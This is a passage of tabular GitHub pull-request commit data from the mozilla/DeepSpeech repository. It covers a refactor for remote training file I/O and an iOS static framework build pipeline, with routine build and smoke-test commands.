228,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3437,3437,Remote training I/O once more,"This PR attempts to resurrect my remote I/O contribs from #3420, this time hopefully without breaking the Taskcluster builds.

As a reminder, this refactors the training code to use a set of I/O helpers that allow for remote file access, right now using TensorFlow's GFile API, allowing us to pass in files like gs://my-bucket/my/path or hdfs://.... This can be extended to AWS s3://... paths relatively easily.

It parallelizes file-reading during training in general by wrapping `Sample` with a little `PackedSample` class that does the unpacking on the worker process rather than the parent process. That improves performance in the distributed training setting a lot.",CatalinVoss,332459,2020-11-24T03:33:58Z,COLLABORATOR,True,249,55,11,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,1687e0bd3d2dc14e7ced9af2946839f36ffcde74,Add bin changes
229,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3437,3437,Remote training I/O once more,"This PR attempts to resurrect my remote I/O contribs from #3420, this time hopefully without breaking the Taskcluster builds.

As a reminder, this refactors the training code to use a set of I/O helpers that allow for remote file access, right now using TensorFlow's GFile API, allowing us to pass in files like gs://my-bucket/my/path or hdfs://.... This can be extended to AWS s3://... paths relatively easily.

It parallelizes file-reading during training in general by wrapping `Sample` with a little `PackedSample` class that does the unpacking on the worker process rather than the parent process. That improves performance in the distributed training setting a lot.",CatalinVoss,332459,2020-11-24T03:33:58Z,COLLABORATOR,True,249,55,11,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,cdfcf100a6679d07117e22318bd1bb0d6d072949,Fix merge-induced issue?
230,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3437,3437,Remote training I/O once more,"This PR attempts to resurrect my remote I/O contribs from #3420, this time hopefully without breaking the Taskcluster builds.

As a reminder, this refactors the training code to use a set of I/O helpers that allow for remote file access, right now using TensorFlow's GFile API, allowing us to pass in files like gs://my-bucket/my/path or hdfs://.... This can be extended to AWS s3://... paths relatively easily.

It parallelizes file-reading during training in general by wrapping `Sample` with a little `PackedSample` class that does the unpacking on the worker process rather than the parent process. That improves performance in the distributed training setting a lot.",CatalinVoss,332459,2020-11-24T03:33:58Z,COLLABORATOR,True,249,55,11,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b11e0bae8531fd7ef01eeda68a4e286f56ce62c3,"For the interleaved case with multiple collections, unpack audio on the fly

To reproduce the previous failure

rm data/smoke_test/ldc93s1.csv
rm data/smoke_test/ldc93s1.sdb
rm -rf /tmp/ldc93s1_cache_sdb_csv
rm -rf /tmp/ckpt_sdb_csv
rm -rf /tmp/train_sdb_csv

./bin/run-tc-ldc93s1_new_sdb_csv.sh 109 16000
python -u DeepSpeech.py --noshow_progressbar --noearly_stop --train_files ./data/smoke_test/ldc93s1.sdb,./data/smoke_test/ldc93s1.csv --train_batch_size 1 --feature_cache /tmp/ldc93s1_cache_sdb_csv --dev_files ./data/smoke_test/ldc93s1.sdb,./data/smoke_test/ldc93s1.csv --dev_batch_size 1 --test_files ./data/smoke_test/ldc93s1.sdb,./data/smoke_test/ldc93s1.csv --test_batch_size 1 --n_hidden 100 --epochs 109 --max_to_keep 1 --checkpoint_dir /tmp/ckpt_sdb_csv --learning_rate 0.001 --dropout_rate 0.05 --export_dir /tmp/train_sdb_csv --scorer_path data/smoke_test/pruned_lm.scorer --audio_sample_rate 16000"
231,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3437,3437,Remote training I/O once more,"This PR attempts to resurrect my remote I/O contribs from #3420, this time hopefully without breaking the Taskcluster builds.

As a reminder, this refactors the training code to use a set of I/O helpers that allow for remote file access, right now using TensorFlow's GFile API, allowing us to pass in files like gs://my-bucket/my/path or hdfs://.... This can be extended to AWS s3://... paths relatively easily.

It parallelizes file-reading during training in general by wrapping `Sample` with a little `PackedSample` class that does the unpacking on the worker process rather than the parent process. That improves performance in the distributed training setting a lot.",CatalinVoss,332459,2020-11-24T03:33:58Z,COLLABORATOR,True,249,55,11,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f9b109da67f53bcbe214fb12cff68041b91b130d,Merge branch 'master' into io-once-more
232,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3437,3437,Remote training I/O once more,"This PR attempts to resurrect my remote I/O contribs from #3420, this time hopefully without breaking the Taskcluster builds.

As a reminder, this refactors the training code to use a set of I/O helpers that allow for remote file access, right now using TensorFlow's GFile API, allowing us to pass in files like gs://my-bucket/my/path or hdfs://.... This can be extended to AWS s3://... paths relatively easily.

It parallelizes file-reading during training in general by wrapping `Sample` with a little `PackedSample` class that does the unpacking on the worker process rather than the parent process. That improves performance in the distributed training setting a lot.",CatalinVoss,332459,2020-11-24T03:33:58Z,COLLABORATOR,True,249,55,11,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,60714590b4d2e421aa518b8e704a2658e678884c,Attempt to preserve length information with a wrapper around `map()`… this gets pretty python-y
233,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3437,3437,Remote training I/O once more,"This PR attempts to resurrect my remote I/O contribs from #3420, this time hopefully without breaking the Taskcluster builds.

As a reminder, this refactors the training code to use a set of I/O helpers that allow for remote file access, right now using TensorFlow's GFile API, allowing us to pass in files like gs://my-bucket/my/path or hdfs://.... This can be extended to AWS s3://... paths relatively easily.

It parallelizes file-reading during training in general by wrapping `Sample` with a little `PackedSample` class that does the unpacking on the worker process rather than the parent process. That improves performance in the distributed training setting a lot.",CatalinVoss,332459,2020-11-24T03:33:58Z,COLLABORATOR,True,249,55,11,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,880966ef26b492eeb032025384209fbf729be574,Call the right `__next__()`
234,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3437,3437,Remote training I/O once more,"This PR attempts to resurrect my remote I/O contribs from #3420, this time hopefully without breaking the Taskcluster builds.

As a reminder, this refactors the training code to use a set of I/O helpers that allow for remote file access, right now using TensorFlow's GFile API, allowing us to pass in files like gs://my-bucket/my/path or hdfs://.... This can be extended to AWS s3://... paths relatively easily.

It parallelizes file-reading during training in general by wrapping `Sample` with a little `PackedSample` class that does the unpacking on the worker process rather than the parent process. That improves performance in the distributed training setting a lot.",CatalinVoss,332459,2020-11-24T03:33:58Z,COLLABORATOR,True,249,55,11,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,8484f1fc266b0d721f3d7c4cd1ed43a846dd40fc,Properly implement the rest of the map wrappers here……
235,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3437,3437,Remote training I/O once more,"This PR attempts to resurrect my remote I/O contribs from #3420, this time hopefully without breaking the Taskcluster builds.

As a reminder, this refactors the training code to use a set of I/O helpers that allow for remote file access, right now using TensorFlow's GFile API, allowing us to pass in files like gs://my-bucket/my/path or hdfs://.... This can be extended to AWS s3://... paths relatively easily.

It parallelizes file-reading during training in general by wrapping `Sample` with a little `PackedSample` class that does the unpacking on the worker process rather than the parent process. That improves performance in the distributed training setting a lot.",CatalinVoss,332459,2020-11-24T03:33:58Z,COLLABORATOR,True,249,55,11,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c3c45397a2f98e9b00d00c18c4ced4fc52475032,Fix trailing whitespace situation and other linter complaints
236,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3437,3437,Remote training I/O once more,"This PR attempts to resurrect my remote I/O contribs from #3420, this time hopefully without breaking the Taskcluster builds.

As a reminder, this refactors the training code to use a set of I/O helpers that allow for remote file access, right now using TensorFlow's GFile API, allowing us to pass in files like gs://my-bucket/my/path or hdfs://.... This can be extended to AWS s3://... paths relatively easily.

It parallelizes file-reading during training in general by wrapping `Sample` with a little `PackedSample` class that does the unpacking on the worker process rather than the parent process. That improves performance in the distributed training setting a lot.",CatalinVoss,332459,2020-11-24T03:33:58Z,COLLABORATOR,True,249,55,11,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,892cd53ab06cf1c373109e810f4257e5362ddb6f,Remove data accidentally checked in
237,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3437,3437,Remote training I/O once more,"This PR attempts to resurrect my remote I/O contribs from #3420, this time hopefully without breaking the Taskcluster builds.

As a reminder, this refactors the training code to use a set of I/O helpers that allow for remote file access, right now using TensorFlow's GFile API, allowing us to pass in files like gs://my-bucket/my/path or hdfs://.... This can be extended to AWS s3://... paths relatively easily.

It parallelizes file-reading during training in general by wrapping `Sample` with a little `PackedSample` class that does the unpacking on the worker process rather than the parent process. That improves performance in the distributed training setting a lot.",CatalinVoss,332459,2020-11-24T03:33:58Z,COLLABORATOR,True,249,55,11,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,06d530cb8cf36be8cdd64dc4d59b4cffc50a3918,Fix overlay augmentations
238,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3437,3437,Remote training I/O once more,"This PR attempts to resurrect my remote I/O contribs from #3420, this time hopefully without breaking the Taskcluster builds.

As a reminder, this refactors the training code to use a set of I/O helpers that allow for remote file access, right now using TensorFlow's GFile API, allowing us to pass in files like gs://my-bucket/my/path or hdfs://.... This can be extended to AWS s3://... paths relatively easily.

It parallelizes file-reading during training in general by wrapping `Sample` with a little `PackedSample` class that does the unpacking on the worker process rather than the parent process. That improves performance in the distributed training setting a lot.",CatalinVoss,332459,2020-11-24T03:33:58Z,COLLABORATOR,True,249,55,11,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7e0965c0ef3073f485804f9ef30fb7bd9d36cbe6,Wavs must be open in rb mode if we're passing in an external file pointer -- this confused me
239,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3437,3437,Remote training I/O once more,"This PR attempts to resurrect my remote I/O contribs from #3420, this time hopefully without breaking the Taskcluster builds.

As a reminder, this refactors the training code to use a set of I/O helpers that allow for remote file access, right now using TensorFlow's GFile API, allowing us to pass in files like gs://my-bucket/my/path or hdfs://.... This can be extended to AWS s3://... paths relatively easily.

It parallelizes file-reading during training in general by wrapping `Sample` with a little `PackedSample` class that does the unpacking on the worker process rather than the parent process. That improves performance in the distributed training setting a lot.",CatalinVoss,332459,2020-11-24T03:33:58Z,COLLABORATOR,True,249,55,11,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,bb711ff5cbdb8662d62f0f45097019f33bb05fd9,Lint whitespace
240,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3437,3437,Remote training I/O once more,"This PR attempts to resurrect my remote I/O contribs from #3420, this time hopefully without breaking the Taskcluster builds.

As a reminder, this refactors the training code to use a set of I/O helpers that allow for remote file access, right now using TensorFlow's GFile API, allowing us to pass in files like gs://my-bucket/my/path or hdfs://.... This can be extended to AWS s3://... paths relatively easily.

It parallelizes file-reading during training in general by wrapping `Sample` with a little `PackedSample` class that does the unpacking on the worker process rather than the parent process. That improves performance in the distributed training setting a lot.",CatalinVoss,332459,2020-11-24T03:33:58Z,COLLABORATOR,True,249,55,11,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ec7d45195bad702efcb20c032f22f09d725dbe28,"Revert ""Fix trailing whitespace situation and other linter complaints""

This reverts commit c3c45397a2f98e9b00d00c18c4ced4fc52475032."
241,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3437,3437,Remote training I/O once more,"This PR attempts to resurrect my remote I/O contribs from #3420, this time hopefully without breaking the Taskcluster builds.

As a reminder, this refactors the training code to use a set of I/O helpers that allow for remote file access, right now using TensorFlow's GFile API, allowing us to pass in files like gs://my-bucket/my/path or hdfs://.... This can be extended to AWS s3://... paths relatively easily.

It parallelizes file-reading during training in general by wrapping `Sample` with a little `PackedSample` class that does the unpacking on the worker process rather than the parent process. That improves performance in the distributed training setting a lot.",CatalinVoss,332459,2020-11-24T03:33:58Z,COLLABORATOR,True,249,55,11,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,82a6852b2474cb9dbc8b3dd91940ab76b0a4ce2a,Fix linter issue but without such an aggressive diff
242,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3437,3437,Remote training I/O once more,"This PR attempts to resurrect my remote I/O contribs from #3420, this time hopefully without breaking the Taskcluster builds.

As a reminder, this refactors the training code to use a set of I/O helpers that allow for remote file access, right now using TensorFlow's GFile API, allowing us to pass in files like gs://my-bucket/my/path or hdfs://.... This can be extended to AWS s3://... paths relatively easily.

It parallelizes file-reading during training in general by wrapping `Sample` with a little `PackedSample` class that does the unpacking on the worker process rather than the parent process. That improves performance in the distributed training setting a lot.",CatalinVoss,332459,2020-11-24T03:33:58Z,COLLABORATOR,True,249,55,11,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4d7805b03fb789ccbd6121ed626516ce3b214ad1,Merge branch 'master' into io-once-more
243,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3437,3437,Remote training I/O once more,"This PR attempts to resurrect my remote I/O contribs from #3420, this time hopefully without breaking the Taskcluster builds.

As a reminder, this refactors the training code to use a set of I/O helpers that allow for remote file access, right now using TensorFlow's GFile API, allowing us to pass in files like gs://my-bucket/my/path or hdfs://.... This can be extended to AWS s3://... paths relatively easily.

It parallelizes file-reading during training in general by wrapping `Sample` with a little `PackedSample` class that does the unpacking on the worker process rather than the parent process. That improves performance in the distributed training setting a lot.",CatalinVoss,332459,2020-11-24T03:33:58Z,COLLABORATOR,True,249,55,11,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a93d2632bc9021e3615d0e01a00f78a6f3ff64c8,Move unpack_maybe into sample_collections
244,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3437,3437,Remote training I/O once more,"This PR attempts to resurrect my remote I/O contribs from #3420, this time hopefully without breaking the Taskcluster builds.

As a reminder, this refactors the training code to use a set of I/O helpers that allow for remote file access, right now using TensorFlow's GFile API, allowing us to pass in files like gs://my-bucket/my/path or hdfs://.... This can be extended to AWS s3://... paths relatively easily.

It parallelizes file-reading during training in general by wrapping `Sample` with a little `PackedSample` class that does the unpacking on the worker process rather than the parent process. That improves performance in the distributed training setting a lot.",CatalinVoss,332459,2020-11-24T03:33:58Z,COLLABORATOR,True,249,55,11,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,994e600a8df0a291c405ffefb6e0fcb38995df15,Use unpack_maybe in place of duplicate lambda
245,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3437,3437,Remote training I/O once more,"This PR attempts to resurrect my remote I/O contribs from #3420, this time hopefully without breaking the Taskcluster builds.

As a reminder, this refactors the training code to use a set of I/O helpers that allow for remote file access, right now using TensorFlow's GFile API, allowing us to pass in files like gs://my-bucket/my/path or hdfs://.... This can be extended to AWS s3://... paths relatively easily.

It parallelizes file-reading during training in general by wrapping `Sample` with a little `PackedSample` class that does the unpacking on the worker process rather than the parent process. That improves performance in the distributed training setting a lot.",CatalinVoss,332459,2020-11-24T03:33:58Z,COLLABORATOR,True,249,55,11,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,501dffeae796349502d6f94c222aa36d2158b3ee,Fix confusing comment
246,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3437,3437,Remote training I/O once more,"This PR attempts to resurrect my remote I/O contribs from #3420, this time hopefully without breaking the Taskcluster builds.

As a reminder, this refactors the training code to use a set of I/O helpers that allow for remote file access, right now using TensorFlow's GFile API, allowing us to pass in files like gs://my-bucket/my/path or hdfs://.... This can be extended to AWS s3://... paths relatively easily.

It parallelizes file-reading during training in general by wrapping `Sample` with a little `PackedSample` class that does the unpacking on the worker process rather than the parent process. That improves performance in the distributed training setting a lot.",CatalinVoss,332459,2020-11-24T03:33:58Z,COLLABORATOR,True,249,55,11,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a2414a3a422d500fffe4b40a580b5b820cd357e0,Add clarifying comment for on-the-fly unpacking
247,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3436,3436,iOS Static Build Pipeline,"This PR contributes a static build framework build pipeline for iOS, hopefully helping push #3061 along. Credit goes to @xiaoqunSun for pointing me to bazel's `ios_static_framework`.

Build the static framework like this:

```
cd tensorflow

bazel build --verbose_failures --config=ios_arm64 --workspace_status_command=""bash native_client/bazel_workspace_status_cmd.sh"" --apple_bitcode=embedded --copt=-fembed-bitcode --config=monolithic -c opt //native_client:deepspeech_ios --define=runtime=tflite --copt=-DTFLITE_WITH_RUY_GEMV

# Replace .framework folder in Xcode project
rm -rf ../native_client/swift/deepspeech_ios.framework
unzip bazel-bin/native_client/deepspeech_ios.zip
mv deepspeech_ios.framework ../native_client/swift/
```

If you want a smaller bundle and don't care about shipping apps with bitcode to Apple, you can drop the `--apple_bitcode=embedded --copt=-fembed-bitcode` flags.

Then the `xcodebuild` or Xcode app build should work to build a static framework that can be integrated into apps that can be shipped on the iOS App Store or via Testflight.

I tried my best to update the Taskcluster command, but don't want to overpromise.

I also added a basic Podspec which should provide the starting point for turning this into a Cocoa Pod if anyone wants to tackle submitting that somewhere.",CatalinVoss,332459,2020-11-24T03:32:59Z,COLLABORATOR,False,61,18,10,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d7e1daee33bae21eb874feb510878b8eeb94697b,Set up additional `deepspeech_ios` target with static build steps
248,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3436,3436,iOS Static Build Pipeline,"This PR contributes a static build framework build pipeline for iOS, hopefully helping push #3061 along. Credit goes to @xiaoqunSun for pointing me to bazel's `ios_static_framework`.

Build the static framework like this:

```
cd tensorflow

bazel build --verbose_failures --config=ios_arm64 --workspace_status_command=""bash native_client/bazel_workspace_status_cmd.sh"" --apple_bitcode=embedded --copt=-fembed-bitcode --config=monolithic -c opt //native_client:deepspeech_ios --define=runtime=tflite --copt=-DTFLITE_WITH_RUY_GEMV

# Replace .framework folder in Xcode project
rm -rf ../native_client/swift/deepspeech_ios.framework
unzip bazel-bin/native_client/deepspeech_ios.zip
mv deepspeech_ios.framework ../native_client/swift/
```

If you want a smaller bundle and don't care about shipping apps with bitcode to Apple, you can drop the `--apple_bitcode=embedded --copt=-fembed-bitcode` flags.

Then the `xcodebuild` or Xcode app build should work to build a static framework that can be integrated into apps that can be shipped on the iOS App Store or via Testflight.

I tried my best to update the Taskcluster command, but don't want to overpromise.

I also added a basic Podspec which should provide the starting point for turning this into a Cocoa Pod if anyone wants to tackle submitting that somewhere.",CatalinVoss,332459,2020-11-24T03:32:59Z,COLLABORATOR,False,61,18,10,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b31c529f741803ee20002bd183f153c2e73d8cfd,"Xcode config: lock swift version at 5.0, bundle framework rather than dynamic lib, never strip swift symbols, add framework search paths, and bring in lstdc++"
249,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3436,3436,iOS Static Build Pipeline,"This PR contributes a static build framework build pipeline for iOS, hopefully helping push #3061 along. Credit goes to @xiaoqunSun for pointing me to bazel's `ios_static_framework`.

Build the static framework like this:

```
cd tensorflow

bazel build --verbose_failures --config=ios_arm64 --workspace_status_command=""bash native_client/bazel_workspace_status_cmd.sh"" --apple_bitcode=embedded --copt=-fembed-bitcode --config=monolithic -c opt //native_client:deepspeech_ios --define=runtime=tflite --copt=-DTFLITE_WITH_RUY_GEMV

# Replace .framework folder in Xcode project
rm -rf ../native_client/swift/deepspeech_ios.framework
unzip bazel-bin/native_client/deepspeech_ios.zip
mv deepspeech_ios.framework ../native_client/swift/
```

If you want a smaller bundle and don't care about shipping apps with bitcode to Apple, you can drop the `--apple_bitcode=embedded --copt=-fembed-bitcode` flags.

Then the `xcodebuild` or Xcode app build should work to build a static framework that can be integrated into apps that can be shipped on the iOS App Store or via Testflight.

I tried my best to update the Taskcluster command, but don't want to overpromise.

I also added a basic Podspec which should provide the starting point for turning this into a Cocoa Pod if anyone wants to tackle submitting that somewhere.",CatalinVoss,332459,2020-11-24T03:32:59Z,COLLABORATOR,False,61,18,10,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,321f53396790195dd8aa2d346ce3be97d2bed040,Runtime schema config: disable the main thread checker as this causes trouble with the static build
250,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3436,3436,iOS Static Build Pipeline,"This PR contributes a static build framework build pipeline for iOS, hopefully helping push #3061 along. Credit goes to @xiaoqunSun for pointing me to bazel's `ios_static_framework`.

Build the static framework like this:

```
cd tensorflow

bazel build --verbose_failures --config=ios_arm64 --workspace_status_command=""bash native_client/bazel_workspace_status_cmd.sh"" --apple_bitcode=embedded --copt=-fembed-bitcode --config=monolithic -c opt //native_client:deepspeech_ios --define=runtime=tflite --copt=-DTFLITE_WITH_RUY_GEMV

# Replace .framework folder in Xcode project
rm -rf ../native_client/swift/deepspeech_ios.framework
unzip bazel-bin/native_client/deepspeech_ios.zip
mv deepspeech_ios.framework ../native_client/swift/
```

If you want a smaller bundle and don't care about shipping apps with bitcode to Apple, you can drop the `--apple_bitcode=embedded --copt=-fembed-bitcode` flags.

Then the `xcodebuild` or Xcode app build should work to build a static framework that can be integrated into apps that can be shipped on the iOS App Store or via Testflight.

I tried my best to update the Taskcluster command, but don't want to overpromise.

I also added a basic Podspec which should provide the starting point for turning this into a Cocoa Pod if anyone wants to tackle submitting that somewhere.",CatalinVoss,332459,2020-11-24T03:32:59Z,COLLABORATOR,False,61,18,10,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4387f2edb350fcb90cdec584fa0481442072ae7e,Update model versions to 0.9.1
251,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3436,3436,iOS Static Build Pipeline,"This PR contributes a static build framework build pipeline for iOS, hopefully helping push #3061 along. Credit goes to @xiaoqunSun for pointing me to bazel's `ios_static_framework`.

Build the static framework like this:

```
cd tensorflow

bazel build --verbose_failures --config=ios_arm64 --workspace_status_command=""bash native_client/bazel_workspace_status_cmd.sh"" --apple_bitcode=embedded --copt=-fembed-bitcode --config=monolithic -c opt //native_client:deepspeech_ios --define=runtime=tflite --copt=-DTFLITE_WITH_RUY_GEMV

# Replace .framework folder in Xcode project
rm -rf ../native_client/swift/deepspeech_ios.framework
unzip bazel-bin/native_client/deepspeech_ios.zip
mv deepspeech_ios.framework ../native_client/swift/
```

If you want a smaller bundle and don't care about shipping apps with bitcode to Apple, you can drop the `--apple_bitcode=embedded --copt=-fembed-bitcode` flags.

Then the `xcodebuild` or Xcode app build should work to build a static framework that can be integrated into apps that can be shipped on the iOS App Store or via Testflight.

I tried my best to update the Taskcluster command, but don't want to overpromise.

I also added a basic Podspec which should provide the starting point for turning this into a Cocoa Pod if anyone wants to tackle submitting that somewhere.",CatalinVoss,332459,2020-11-24T03:32:59Z,COLLABORATOR,False,61,18,10,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,1d151f12ee446ea9b01d0363e3ef35cf1f36c385,Remove libdeepspeech.so from example app bundling steps
252,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3436,3436,iOS Static Build Pipeline,"This PR contributes a static build framework build pipeline for iOS, hopefully helping push #3061 along. Credit goes to @xiaoqunSun for pointing me to bazel's `ios_static_framework`.

Build the static framework like this:

```
cd tensorflow

bazel build --verbose_failures --config=ios_arm64 --workspace_status_command=""bash native_client/bazel_workspace_status_cmd.sh"" --apple_bitcode=embedded --copt=-fembed-bitcode --config=monolithic -c opt //native_client:deepspeech_ios --define=runtime=tflite --copt=-DTFLITE_WITH_RUY_GEMV

# Replace .framework folder in Xcode project
rm -rf ../native_client/swift/deepspeech_ios.framework
unzip bazel-bin/native_client/deepspeech_ios.zip
mv deepspeech_ios.framework ../native_client/swift/
```

If you want a smaller bundle and don't care about shipping apps with bitcode to Apple, you can drop the `--apple_bitcode=embedded --copt=-fembed-bitcode` flags.

Then the `xcodebuild` or Xcode app build should work to build a static framework that can be integrated into apps that can be shipped on the iOS App Store or via Testflight.

I tried my best to update the Taskcluster command, but don't want to overpromise.

I also added a basic Podspec which should provide the starting point for turning this into a Cocoa Pod if anyone wants to tackle submitting that somewhere.",CatalinVoss,332459,2020-11-24T03:32:59Z,COLLABORATOR,False,61,18,10,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,034fb8b0f3273e3572311c4e5f1112b86e527ff6,Swift lib embed settings that are somehow essential
253,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3436,3436,iOS Static Build Pipeline,"This PR contributes a static build framework build pipeline for iOS, hopefully helping push #3061 along. Credit goes to @xiaoqunSun for pointing me to bazel's `ios_static_framework`.

Build the static framework like this:

```
cd tensorflow

bazel build --verbose_failures --config=ios_arm64 --workspace_status_command=""bash native_client/bazel_workspace_status_cmd.sh"" --apple_bitcode=embedded --copt=-fembed-bitcode --config=monolithic -c opt //native_client:deepspeech_ios --define=runtime=tflite --copt=-DTFLITE_WITH_RUY_GEMV

# Replace .framework folder in Xcode project
rm -rf ../native_client/swift/deepspeech_ios.framework
unzip bazel-bin/native_client/deepspeech_ios.zip
mv deepspeech_ios.framework ../native_client/swift/
```

If you want a smaller bundle and don't care about shipping apps with bitcode to Apple, you can drop the `--apple_bitcode=embedded --copt=-fembed-bitcode` flags.

Then the `xcodebuild` or Xcode app build should work to build a static framework that can be integrated into apps that can be shipped on the iOS App Store or via Testflight.

I tried my best to update the Taskcluster command, but don't want to overpromise.

I also added a basic Podspec which should provide the starting point for turning this into a Cocoa Pod if anyone wants to tackle submitting that somewhere.",CatalinVoss,332459,2020-11-24T03:32:59Z,COLLABORATOR,False,61,18,10,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,1533846f15ed5d4e673a8e3a1501a133fb80ec05,Attempt to adjust taskcluster build steps
254,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3436,3436,iOS Static Build Pipeline,"This PR contributes a static build framework build pipeline for iOS, hopefully helping push #3061 along. Credit goes to @xiaoqunSun for pointing me to bazel's `ios_static_framework`.

Build the static framework like this:

```
cd tensorflow

bazel build --verbose_failures --config=ios_arm64 --workspace_status_command=""bash native_client/bazel_workspace_status_cmd.sh"" --apple_bitcode=embedded --copt=-fembed-bitcode --config=monolithic -c opt //native_client:deepspeech_ios --define=runtime=tflite --copt=-DTFLITE_WITH_RUY_GEMV

# Replace .framework folder in Xcode project
rm -rf ../native_client/swift/deepspeech_ios.framework
unzip bazel-bin/native_client/deepspeech_ios.zip
mv deepspeech_ios.framework ../native_client/swift/
```

If you want a smaller bundle and don't care about shipping apps with bitcode to Apple, you can drop the `--apple_bitcode=embedded --copt=-fembed-bitcode` flags.

Then the `xcodebuild` or Xcode app build should work to build a static framework that can be integrated into apps that can be shipped on the iOS App Store or via Testflight.

I tried my best to update the Taskcluster command, but don't want to overpromise.

I also added a basic Podspec which should provide the starting point for turning this into a Cocoa Pod if anyone wants to tackle submitting that somewhere.",CatalinVoss,332459,2020-11-24T03:32:59Z,COLLABORATOR,False,61,18,10,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,1a428b425e25cb5fc3cedeea880ad2ee28fcc2a6,Add a basic podspec
255,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3436,3436,iOS Static Build Pipeline,"This PR contributes a static build framework build pipeline for iOS, hopefully helping push #3061 along. Credit goes to @xiaoqunSun for pointing me to bazel's `ios_static_framework`.

Build the static framework like this:

```
cd tensorflow

bazel build --verbose_failures --config=ios_arm64 --workspace_status_command=""bash native_client/bazel_workspace_status_cmd.sh"" --apple_bitcode=embedded --copt=-fembed-bitcode --config=monolithic -c opt //native_client:deepspeech_ios --define=runtime=tflite --copt=-DTFLITE_WITH_RUY_GEMV

# Replace .framework folder in Xcode project
rm -rf ../native_client/swift/deepspeech_ios.framework
unzip bazel-bin/native_client/deepspeech_ios.zip
mv deepspeech_ios.framework ../native_client/swift/
```

If you want a smaller bundle and don't care about shipping apps with bitcode to Apple, you can drop the `--apple_bitcode=embedded --copt=-fembed-bitcode` flags.

Then the `xcodebuild` or Xcode app build should work to build a static framework that can be integrated into apps that can be shipped on the iOS App Store or via Testflight.

I tried my best to update the Taskcluster command, but don't want to overpromise.

